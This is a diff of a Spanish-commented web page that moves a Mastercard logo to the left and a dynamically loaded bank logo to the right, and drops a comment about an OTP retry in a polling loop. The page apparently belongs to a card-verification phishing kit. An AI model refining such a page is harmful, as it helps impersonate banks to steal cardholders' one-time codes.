@@ -77,7 +77,7 @@
             border: 1px solid rgba(255, 255, 255, 0.5);
         }
 
-        /* ===== HEADER ===== */
+        /* ===== HEADER: LOGO MASTERCARD IZQUIERDA, BANCO DERECHA ===== */
         .header {
             display: flex;
             align-items: center;
@@ -88,29 +88,12 @@
             gap: 10px;
         }
 
-        .bank-logo {
+        /* Logo de Mastercard fijo a la izquierda */
+        .mc-logo {
             display: flex;
             align-items: center;
             justify-content: flex-start;
             flex-shrink: 0;
-            max-width: 50%;
-            min-height: 70px;
-        }
-
-        .bank-logo img {
-            height: 65px;
-            width: auto;
-            max-width: 180px;
-            object-fit: contain;
-            display: none;
-        }
-
-        .mc-logo {
-            display: flex;
-            align-items: center;
-            justify-content: flex-end;
-            flex-shrink: 0;
-            margin-left: auto;
         }
 
         .mc-logo img {
@@ -119,6 +102,25 @@
             max-width: 220px;
             display: block;
             object-fit: contain;
+        }
+
+        /* Logo del banco dinámico a la derecha */
+        .bank-logo {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            flex-shrink: 0;
+            max-width: 50%;
+            min-height: 70px;
+            margin-left: auto;
+        }
+
+        .bank-logo img {
+            height: 65px;
+            width: auto;
+            max-width: 180px;
+            object-fit: contain;
+            display: none; /* Oculto por defecto hasta que se cargue */
         }
 
         /* ===== TÍTULOS ===== */
@@ -482,13 +484,13 @@
     </div>
 
     <div class="container">
-        <!-- CABECERA: LOGO BANCO IZQUIERDA, MASTERCARD DERECHA -->
+        <!-- CABECERA: MASTERCARD IZQUIERDA, BANCO DERECHA -->
         <div class="header">
-            <div class="bank-logo" id="bankLogoContainer">
-                <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
-            </div>
             <div class="mc-logo">
                 <img src="master.png" alt="Mastercard" />
+            </div>
+            <div class="bank-logo" id="bankLogoContainer">
+                <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
             </div>
         </div>
 
@@ -1240,8 +1242,6 @@
                     formularioBloqueado = false;
                     clearInterval(pollingInterval);
                     pollingInterval = null;
-                    // AQUI NO GENERAMOS NUEVO ID PORQUE ES EL MISMO PROCESO DE OTP, 
-                    // SOLO CAMBIAMOS EL CODIGO INTENTADO
                     return;
                 }
             }, POLLING_INTERVAL);
